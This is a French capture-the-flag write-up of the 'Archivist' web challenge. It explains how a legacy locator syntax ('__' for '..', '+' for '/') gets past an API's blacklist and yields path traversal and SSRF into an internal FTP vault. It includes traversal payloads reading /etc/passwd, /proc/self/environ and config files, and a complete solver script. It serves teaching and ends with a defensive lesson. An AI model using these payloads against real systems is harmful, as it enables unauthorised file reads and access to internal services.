# Archivist — writeup

## Énoncé HTL

- **Titre :** Archivist
- **Catégorie :** webex
- **Points :** 521
- **Solves :** non récupéré (CTF terminé au moment d'écrire le writeup)
- **Host:port :** `http://web.ctf.yogosha.com:8006`

> L’archive documentaire du lycée expose une petite API : il est possible
> d’enregistrer un document en indiquant son chemin relatif, et le service en
> conserve une copie en cache.
>
> Les documents retirés de l’archive active sont conservés dans le coffre de
> préservation, situé sur un segment interne que l’API publique ne peut pas
> atteindre. Une classe de conservation scellée y est stockée de manière
> permanente.

**Flag :** `HTL{l3g4cy_l0c4t0rs_0utl1v3d_th3_p0l1cy}`

---

## Architecture et modèle

Deux services :

- **`api`** (`services/api/app.py`) — exposé publiquement. Il valide le champ
  `ref` fourni par le joueur, puis le transmet tel quel à un service interne.
- **`fetcher`/`worker`** (`worker.py`) — interne (`http://fetcher:9000`). C'est
  **lui** qui résout le `ref` et va chercher les octets. Il garde une copie en
  cache, relisible via l'API.

Endpoints publics (donnés par `GET /`) :

| Méthode / route | rôle |
|---|---|
| `GET  /api/source` | **renvoie le code source de l'API** (la politique de validation) |
| `POST /api/references` | enregistre une référence, corps `{"ref":"<chemin relatif>"}` |
| `GET  /api/references/<id>` | métadonnées d'une référence |
| `GET  /api/references/<id>/raw` | **octets** de la référence mise en cache |

Le flag est dans un **coffre de préservation** sur un segment interne :
inaccessible depuis l'extérieur, mais **le fetcher, lui, peut l'atteindre**.
Tout l'enjeu est donc de faire agir le fetcher pour notre compte (SSRF /
traversée).

### Protections côté API (`validate_reference`)

L'API refuse explicitement, avant de transmettre le `ref` :

```python
REF_RE = re.compile(r"[A-Za-z0-9/._:+-]{1,200}")   # jeu de caractères restreint

def validate_reference(ref):
    if not REF_RE.fullmatch(ref):
        raise Rejected("reference contains invalid characters")
    if ref.startswith("/"):
        raise Rejected("references must be relative to the archive root")
    parts = urlsplit(ref)
    if parts.scheme in BLOCKED_SCHEMES:     # http, https, ftp, file, data, ...
        raise Rejected("absolute URLs are not accepted")
    if parts.netloc:
        raise Rejected("remote references are not accepted")
    if ".." in ref:                          # <-- blacklist de path traversal
        raise Rejected("path traversal detected")
```

De plus, chaque `POST /api/references` est **volontairement ralenti (~2,5 s)** et
sérialisé par client (anti-bruteforce du format). Ce n'est pas un obstacle, juste
un délai.

---

## La vulnérabilité

Le `README.txt` du corpus et le code du fetcher documentent un **format de
locator hérité** (importeur 2019) :

```
<classe>:<chemin legacy>
```

avec, dans le chemin legacy :

- `+`  → séparateur de segments (équivaut à `/`) ;
- `__` → **référence au parent** (équivaut à `..`).

Côté fetcher (`worker.py`), la résolution :

```python
LOCATOR_RE    = re.compile(r"([A-Za-z][A-Za-z0-9+.-]*):(.*)", re.DOTALL)
LEGACY_PARENT = "__"

def expand_legacy(tail):
    return "/".join(".." if segment == LEGACY_PARENT else segment
                    for segment in tail.split("+"))      # '+' -> '/', '__' -> '..'

def locator_bases():
    bases = {"arc": ARCHIVE_BASE}                        # file:///srv/archive/
    name   = CONF.get("preservation_class")
    host   = CONF.get("preservation_endpoint")
    if name and host:                                    # classe du coffre
        user   = CONF.get("preservation_user", "")
        secret = CONF.get("preservation_secret", "")
        cred   = "%s:%s@" % (user, secret) if user else ""
        bases[name] = "ftp://%s%s/" % (cred, host)       # ftp://user:secret@preserve:2121/
    return bases
```

**Le décalage d'interprétation** est la faille :

1. L'API fait un `urlsplit(ref)` et bloque une **liste noire** de schémas et la
   sous-chaîne `".."`. Pour un `ref` comme `arc:__+__+etc+passwd` :
   - le « scheme » vu par `urlsplit` est `arc` → **pas dans la blacklist** ;
   - il n'y a **ni** `..` **ni** `/` littéral → le filtre `".." in ref` est aveugle ;
   - pas de `netloc`, pas de `/` en tête → **accepté**.
2. Le fetcher, lui, **décode** `__` en `..` et `+` en `/`, puis fait un
   `urljoin(base, ...)`. Il obtient donc un vrai chemin remontant.

Conséquences :

- avec la classe `arc` (base `file:///srv/archive/`) → **lecture de fichier
  arbitraire** sur le fetcher (`arc:__+__+etc+passwd` = `/etc/passwd`) ;
- avec la classe **`preservation`** (base `ftp://…@preserve:2121/`) → le fetcher
  se connecte **pour nous** au coffre FTP interne, identifiants compris, via
  `urlretrieve`. On n'a même pas besoin de connaître le mot de passe.

> Remarque ironique laissée dans le code : le fetcher impose qu'un nom de classe
> commence par une lettre « exactement comme `urlsplit` », pour que l'API et le
> resolver « soient d'accord sur ce qu'est un nom de classe ». Ils sont d'accord
> sur la *forme*, mais pas sur le *sens* de `__` — c'est tout le bug.

---

## Résolution pas à pas

On s'appuie sur un seul primitif : **enregistrer un `ref`, puis relire sa copie
en cache**.

```python
import json, urllib.request

base = "http://web.ctf.yogosha.com:8006"

def register(ref):
    body = json.dumps({"ref": ref}).encode()
    req  = urllib.request.Request(base + "/api/references", data=body,
            headers={"Content-Type": "application/json"}, method="POST")
    meta = json.loads(urllib.request.urlopen(req, timeout=60).read())
    rid  = meta["id"]                                    # KeyError si rejeté
    return urllib.request.urlopen(base + "/api/references/%s/raw" % rid,
                                  timeout=60).read()
```

**Étape 1 — récupérer le code / la doc.** `GET /api/source` donne `app.py`, et
le `README.txt` du corpus décrit le format `classe:...` (`+`, `__`). C'est ce qui
met sur la piste.

```python
# facultatif mais c'est là qu'on comprend tout
open("app.py","wb").write(urllib.request.urlopen(base + "/api/source").read())
print(register("README.txt").decode())
```

**Étape 2 — prouver la traversée** (la base `arc` = `file:///srv/archive/`) :

```python
print(register("arc:__+__+proc+self+environ").decode())
# -> ARCHIVE_ROOT=/srv/archive, donc ../../ depuis /srv/archive atteint la racine
```

**Étape 3 — lire le code du fetcher** sans connaître son chemin, via le symlink
`/proc/self/cwd` (répertoire de travail du process) :

```python
print(register("arc:__+__+proc+self+cwd+worker.py").decode())
# -> on y voit locator_bases() et la classe "preservation" = FTP
```

**Étape 4 — lire la config** qui contient le nom de la classe du coffre :

```python
conf = register("arc:__+__+etc+archivist+worker.conf").decode()
# preservation_endpoint = preserve:2121
# preservation_class    = pv66d45990
import re
pclass = re.search(r"preservation_class\s*=\s*(\S+)", conf).group(1)
```

**Étape 5 — fouiller le coffre FTP** via cette classe. Un chemin vide liste la
racine (urlretrieve d'un répertoire FTP = `LIST`) :

```python
print(register(pclass + ":").decode())                  # -> 000-README.txt, pending/, sealed/
# sealed/ refuse le listing (confidentiel) MAIS la file d'attente trace tout :
queue = register(pclass + ":pending+queue.txt").decode()
# ligne "incident 7731, permanent seal" -> classe RC-7731-JC86G0
rc = next(re.search(r"RC-[A-Za-z0-9-]+", l).group(0)
          for l in queue.splitlines() if "permanent" in l.lower())
```

**Étape 6 — récupérer le flag :**

```python
print(register(pclass + ":sealed+" + rc).decode())          # -> flag.txt, manifest.txt
print(register(pclass + ":sealed+" + rc + "+flag.txt").decode().strip())
# HTL{l3g4cy_l0c4t0rs_0utl1v3d_th3_p0l1cy}
```

---

## Script complet → Script intégral

Autonome (stdlib seulement), lançable par `python3 solve.py <host> <port>`
(défaut `web.ctf.yogosha.com 8006`). Il relit dynamiquement la classe de
préservation et la classe scellée, donc rien n'est codé en dur de fragile.

```python
#!/usr/bin/env python3
"""
Archivist - HTL 2026 (categorie webex)
Solveur autonome, stdlib uniquement.
Usage: python3 solve.py [host] [port]   (defaut: web.ctf.yogosha.com 8006)
"""
import json
import re
import sys
import urllib.request


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "web.ctf.yogosha.com"
    port = sys.argv[2] if len(sys.argv) > 2 else "8006"
    base = "http://%s:%s" % (host, port)

    def register(ref):
        """Enregistre un 'ref' puis lit la copie mise en cache.
        Renvoie (True, bytes) si accepte, (False, message) sinon.
        NB: chaque POST est throttle ~2.5s cote serveur, c'est normal."""
        body = json.dumps({"ref": ref}).encode()
        req = urllib.request.Request(
            base + "/api/references", data=body,
            headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(req, timeout=60) as r:
            meta = json.loads(r.read())
        if "id" not in meta:
            return False, meta.get("message", "rejet")
        with urllib.request.urlopen(
                base + "/api/references/%s/raw" % meta["id"], timeout=60) as r:
            return True, r.read()

    def must(ref):
        ok, data = register(ref)
        if not ok:
            sys.exit("[-] %r rejete: %s" % (ref, data))
        return data.decode("utf-8", "replace")

    print("[*] cible: %s" % base)

    # 1) Config du fetcher via traversee de chemin (arc:__+__ = ../../)
    #    ARCHIVE_ROOT=/srv/archive -> ../../etc/archivist/worker.conf
    conf = must("arc:__+__+etc+archivist+worker.conf")
    pclass = re.search(r"preservation_class\s*=\s*(\S+)", conf).group(1)
    print("[+] classe de preservation (coffre FTP): %s" % pclass)

    # 2) La file d'attente liste toutes les classes scellees -> prendre le permanent
    queue = must("%s:pending+queue.txt" % pclass)
    rc = None
    for line in queue.splitlines():
        if "permanent" in line.lower():
            m = re.search(r"RC-[A-Za-z0-9-]+", line)
            if m:
                rc = m.group(0)
    if not rc:
        sys.exit("[-] aucune classe scellee permanente trouvee dans la file")
    print("[+] classe scellee permanente: %s" % rc)

    # 3) Lister la classe scellee et reperer le flag
    listing = must("%s:sealed+%s" % (pclass, rc))
    fname = "flag.txt" if "flag.txt" in listing else listing.split()[-1]
    print("[+] fichier cible: %s" % fname)

    # 4) Exfiltrer le flag (le fetcher injecte lui-meme les identifiants FTP)
    flag = must("%s:sealed+%s+%s" % (pclass, rc, fname)).strip()
    print("\n[FLAG] %s" % flag)


if __name__ == "__main__":
    main()
```

Sortie attendue :

```
[*] cible: http://web.ctf.yogosha.com:8006
[+] classe de preservation (coffre FTP): pv66d45990
[+] classe scellee permanente: RC-7731-JC86G0
[+] fichier cible: flag.txt

[FLAG] HTL{l3g4cy_l0c4t0rs_0utl1v3d_th3_p0l1cy}
```

---

## Flag

```
HTL{l3g4cy_l0c4t0rs_0utl1v3d_th3_p0l1cy}
```

## Leçon

Une **liste noire** (`..`, `http://`, `file://`…) ne protège pas : il existe
presque toujours une autre écriture de la même chose que le filtre ne connaît
pas — ici le vieux format de locator où `__` = `..`. La bonne approche est de
valider le **chemin résolu** (canonicalisation puis vérification qu'il reste dans
la racine autorisée), pas la chaîne brute, et de ne jamais laisser deux composants
interpréter différemment la même entrée. C'est exactement ce que raconte le flag :
*legacy locators outlived the policy*.
